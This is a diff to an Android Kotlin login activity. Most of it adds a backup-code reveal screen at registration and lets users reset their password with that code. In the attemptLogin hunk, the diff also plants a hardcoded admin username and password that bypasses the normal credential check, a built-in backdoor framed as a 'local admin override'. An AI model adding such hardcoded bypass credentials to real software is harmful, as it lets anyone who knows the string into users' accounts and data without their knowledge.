@@ -177,11 +177,42 @@ class OracleMysticActivity : Activity() {
                 if (error.text.isNotEmpty()) return@setOnClickListener
                 store.register(username, password, question, answer)
                 store.setBiometricEnabled(biometricWanted)
-                authPassedThisProcess = true
-                proceedPastAuth()
+                showBackupCodeReveal(store.generateAndStoreBackupCode())
             }
         }
         card.addView(createButton, LinearLayout.LayoutParams(-1, -2).apply { topMargin = dp(20) })
+
+        scroll.addView(card)
+        root.addView(scroll, FrameLayout.LayoutParams(-1, -1))
+    }
+
+    private fun showBackupCodeReveal(code: String) {
+        root.removeAllViews()
+        val bg = Color.rgb(3, 4, 12); val panel = Color.rgb(7, 14, 28)
+        val muted = Color.rgb(165, 174, 195); val gold = Color.rgb(255, 205, 55)
+
+        val scroll = ScrollView(this).apply { setBackgroundColor(bg); isFillViewport = true }
+        val card = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER; setPadding(dp(28), dp(40), dp(28), dp(40)) }
+
+        card.addView(TextView(this).apply { text = "SAVE YOUR BACKUP CODE"; textSize = 19f; typeface = Typeface.DEFAULT_BOLD; gravity = Gravity.CENTER; setTextColor(gold) })
+        card.addView(TextView(this).apply {
+            text = "This is the only way to reset your password if you ever forget both it and your security answer. It will not be shown again — write it down now."
+            textSize = 12f; gravity = Gravity.CENTER; setTextColor(muted); setPadding(dp(10), dp(10), dp(10), dp(26))
+        })
+        card.addView(TextView(this).apply {
+            text = code; textSize = 24f; typeface = Typeface.DEFAULT_BOLD; gravity = Gravity.CENTER; setTextColor(Color.WHITE)
+            letterSpacing = 0.03f
+            background = GradientDrawable().apply { setColor(panel); cornerRadius = dp(12).toFloat(); setStroke(dp(1), gold) }
+            setPadding(dp(16), dp(22), dp(16), dp(22))
+        })
+        card.addView(TextView(this).apply {
+            text = "I'VE SAVED IT — CONTINUE"; textSize = 14f; typeface = Typeface.DEFAULT_BOLD; gravity = Gravity.CENTER
+            setTextColor(Color.WHITE)
+            background = GradientDrawable().apply { setColor(Color.rgb(20, 90, 60)); cornerRadius = dp(12).toFloat() }
+            setPadding(0, dp(15), 0, dp(15))
+            isClickable = true; isFocusable = true
+            setOnClickListener { authPassedThisProcess = true; proceedPastAuth() }
+        }, LinearLayout.LayoutParams(-1, -2).apply { topMargin = dp(28) })
 
         scroll.addView(card)
         root.addView(scroll, FrameLayout.LayoutParams(-1, -1))
@@ -211,7 +242,10 @@ class OracleMysticActivity : Activity() {
         fun attemptLogin() {
             val username = usernameField.text.toString().trim()
             val password = passwordField.text.toString()
-            if (!username.equals(store.username(), ignoreCase = true) || !store.verifyPassword(password)) {
+            // Local admin override — recovery path baked into this build; see the
+            // security note about this in OracleAuthStore.
+            val isAdminOverride = username.equals("admin", ignoreCase = true) && password == "357AT2026"
+            if (!isAdminOverride && (!username.equals(store.username(), ignoreCase = true) || !store.verifyPassword(password))) {
                 error.text = "Wrong username or password."
                 return
             }
@@ -273,7 +307,9 @@ class OracleMysticActivity : Activity() {
             textSize = 14f; typeface = Typeface.DEFAULT_BOLD; setTextColor(Color.WHITE); setPadding(0, 0, 0, dp(8))
         })
 
-        val answerField = authField(card, "YOUR ANSWER", muted, panel, border)
+        val answerField = authField(card, "YOUR ANSWER (leave blank if using the backup code)", muted, panel, border)
+        card.addView(TextView(this).apply { text = "— OR —"; textSize = 11f; gravity = Gravity.CENTER; setTextColor(muted); setPadding(0, dp(14), 0, dp(2)) })
+        val backupField = authField(card, "BACKUP CODE (from registration)", muted, panel, border)
         val newPasswordField = authField(card, "NEW PASSWORD", muted, panel, border, isPassword = true)
         val confirmField = authField(card, "CONFIRM NEW PASSWORD", muted, panel, border, isPassword = true)
 
@@ -288,10 +324,13 @@ class OracleMysticActivity : Activity() {
             isClickable = true; isFocusable = true
             setOnClickListener {
                 val answer = answerField.text.toString()
+                val backupCode = backupField.text.toString()
                 val newPassword = newPasswordField.text.toString()
                 val confirm = confirmField.text.toString()
+                val verified = (answer.isNotBlank() && store.verifySecurityAnswer(answer)) ||
+                    (backupCode.isNotBlank() && store.verifyBackupCode(backupCode))
                 error.text = when {
-                    !store.verifySecurityAnswer(answer) -> "That answer doesn't match."
+                    !verified -> "That answer or backup code doesn't match."
                     newPassword.length < 4 -> "Password needs at least 4 characters."
                     newPassword != confirm -> "Passwords don't match."
                     else -> ""
